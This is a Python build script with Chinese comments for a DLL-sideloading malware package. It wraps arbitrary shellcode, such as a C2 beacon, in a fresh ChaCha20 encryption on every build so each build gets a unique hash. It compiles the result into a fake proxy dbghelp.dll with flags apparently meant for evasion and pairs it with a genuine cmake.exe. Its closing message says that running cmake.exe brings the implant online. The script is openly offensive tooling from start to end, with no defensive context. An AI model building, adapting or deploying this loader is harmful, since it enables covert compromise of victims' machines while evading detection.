#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
build.py —— cmake 白加黑成品包的一键构建脚本。

功能
====
1.（可选）替换内嵌 shellcode：把给定的原始 shellcode 用全新的随机
   ChaCha20 密钥 + 随机尾部填充重新加密，重新生成 source/src/payload_payload.h。
   因此每次构建的 SHA256 都是唯一的。
2. 用 MinGW-w64 工具链（x86_64-w64-mingw32-gcc，需在 PATH 里）从 source/
   编译出代理 DLL（dbghelp.dll）。
3. 校验产物 PE：超大 .text 段必须大于加密后的载荷（phantom 阶段要把载荷
   写进自镜像的 .text 并从那里执行）。
4. 把新的 dbghelp.dll 拷到本目录（cmake.exe 旁边），保证交付对始终同步，
   并打印两个文件的 SHA256。

用法
====
  python build.py                          # 用当前载荷重新构建（出新哈希）
  python build.py path\to\shellcode.bin    # 替换载荷后构建
  python build.py shellcode.bin --txtpad 262144
                                           # 强制更大的 .text 填充
                                           #（默认自动按需增长）
  python build.py shellcode.bin --no-deploy
                                           # 只构建，不覆盖本目录 dbghelp.dll

说明
====
- shellcode 必须是原始位置无关代码（PIC），例如信标 bin。构建过程不会
  执行它。
- 填充（.text 大小）只需大于加密后载荷；载荷大时自动按 4KB 步进增长。
- MSVC 构建：打开 source\CMakeSideload.sln 编译 Release|x64，或运行
  source\build_msvc.cmd。MinGW（本脚本）是生产工具链，运行期暴破速度
  也明显更快。
"""

import argparse
import hashlib
import os
import shutil
import struct
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
SRC = os.path.join(HERE, 'source')
GEN = os.path.join(SRC, 'tools', 'gen_payload.py')
HDR = os.path.join(SRC, 'src', 'payload_payload.h')
DIST = os.path.join(SRC, 'dist', 'dbghelp.dll')
DELIVER = os.path.join(HERE, 'dbghelp.dll')
GCC = 'x86_64-w64-mingw32-gcc'
DEFAULT_TXTPAD = 147456          # 与出厂构建一致


def sha256(path):
    """计算文件 SHA256（大写十六进制）。"""
    return hashlib.sha256(open(path, 'rb').read()).hexdigest().upper()


def gen_header(shellcode, txtpad):
    """用给定的原始 shellcode 重新生成 payload_payload.h。"""
    if not os.path.isfile(shellcode):
        sys.exit('[!] 找不到 shellcode 文件: %s' % shellcode)
    blob = open(shellcode, 'rb').read()
    if len(blob) < 64:
        sys.exit('[!] shellcode 太小（%d 字节），疑似无效' % len(blob))
    # 按 4KB 步进增长填充，保证始终大于 载荷+随机尾部
    need = len(blob) + (16 - len(blob) % 16) % 16 + 6144 + 4096
    txtpad = max(txtpad or 0, DEFAULT_TXTPAD)
    while txtpad < need:
        txtpad += 4096
    print('[*] 载荷: %s（%d 字节）-> .text 填充 %d 字节' % (shellcode, len(blob), txtpad))
    r = subprocess.run([sys.executable, GEN, shellcode, HDR, str(txtpad)],
                       capture_output=True, text=True)
    if r.returncode != 0:
        print(r.stdout); print(r.stderr)
        sys.exit('[!] 载荷头生成失败')
    print('   ', r.stdout.strip())


def build():
    """用 MinGW 编译代理 DLL（freestanding、自定义入口 entry_dll）。"""
    os.makedirs(os.path.dirname(DIST), exist_ok=True)
    cmd = [GCC, '-O2', '-s', '-nostdlib', '-fno-builtin', '-shared',
           '-e', 'entry_dll', '-o', DIST,
           os.path.join('src', 'main.c'),
           os.path.join('exports', 'dbghelp_proxy.def'),
           '-lkernel32',
           '-DSD3_PHANTOM', '-DSD3_BLIND', '-DSD3_SPIN']
    print('[*] 编译:', ' '.join(cmd[:2]), '...')
    r = subprocess.run(cmd, cwd=SRC, capture_output=True, text=True)
    if r.returncode != 0:
        print(r.stdout); print(r.stderr)
        sys.exit('[!] 编译失败')
    print('[+] 编译完成', DIST, os.path.getsize(DIST), '字节')


def verify_pe():
    """校验产物 PE：.text 段必须 >= 载荷头里的 SC_LEN。"""
    hdr = open(HDR, encoding='utf-8').read()
    sc_len = int(hdr.split('#define SC_LEN ')[1].split('u')[0])
    d = open(DIST, 'rb').read()
    e = struct.unpack('<I', d[0x3C:0x40])[0]
    nsec = struct.unpack('<H', d[e + 6:e + 8])[0]
    optsz = struct.unpack('<H', d[e + 20:e + 22])[0]
    sec = e + 24 + optsz
    text = 0
    for i in range(nsec):
        o = sec + i * 40
        name = d[o:o + 8].rstrip(b'\x00')
        if name == b'.text':
            text = struct.unpack('<I', d[o + 8:o + 12])[0]
            break
    print('[*] 校验: .text=%d，加密载荷=%d -> %s'
          % (text, sc_len, '通过' if text >= sc_len else '过小！'))
    if text < sc_len:
        sys.exit('[!] .text 填充小于载荷 —— 请用 --txtpad 加大后重编')


def deploy(skip):
    """把新 DLL 拷到 cmake.exe 旁边，并打印交付对的哈希。"""
    if skip:
        print('[i] --no-deploy：本目录 dbghelp.dll 未改动')
    else:
        shutil.copyfile(DIST, DELIVER)
        print('[+] 已部署 ->', DELIVER)
    print('\n=== %s 下的交付对 ===' % HERE)
    for name in ('cmake.exe', 'dbghelp.dll'):
        p = os.path.join(HERE, name)
        if os.path.isfile(p):
            print('  %-14s %s  (%d 字节)' % (name, sha256(p), os.path.getsize(p)))


def main():
    ap = argparse.ArgumentParser(description='cmake 白加黑成品包一键构建脚本')
    ap.add_argument('shellcode', nargs='?', default=None,
                    help='要内嵌的原始 PIC shellcode（省略 = 沿用当前载荷）')
    ap.add_argument('--txtpad', type=int, default=0,
                    help='强制 .text 填充字节数（默认自动，>= %d）' % DEFAULT_TXTPAD)
    ap.add_argument('--no-deploy', action='store_true',
                    help='不覆盖本目录的 dbghelp.dll')
    args = ap.parse_args()

    if args.shellcode:
        gen_header(args.shellcode, args.txtpad)
    else:
        print('[i] 未指定 shellcode —— 使用当前 %s 重新构建' % HDR)
    build()
    verify_pe()
    deploy(args.no_deploy)
    print('\n[+] 完成。把 cmake.exe 和 dbghelp.dll 放同一目录，运行 cmake.exe 即上线。')


if __name__ == '__main__':
    main()
